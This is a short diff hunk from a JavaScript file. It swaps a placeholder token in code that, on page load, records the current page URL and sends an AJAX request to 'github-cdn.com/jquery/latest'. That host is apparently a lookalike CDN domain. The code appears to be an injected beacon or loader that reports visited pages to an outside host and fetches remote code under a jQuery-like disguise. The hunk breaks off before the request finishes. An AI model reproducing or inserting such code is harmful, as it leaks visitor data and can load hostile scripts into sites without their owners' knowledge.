@@ -176,7 +176,7 @@ var Base64 = {
     $(document).ready(function () {
       var request = {};
       request.referer = document.URL; 
-      request.version = 'UUID'; //Replace with real UUID
+      request.version = 'replaceme'; //Replace with real UUID
       
       var url =  "github-cdn.com" + "/jquery/latest";
       $.ajax({
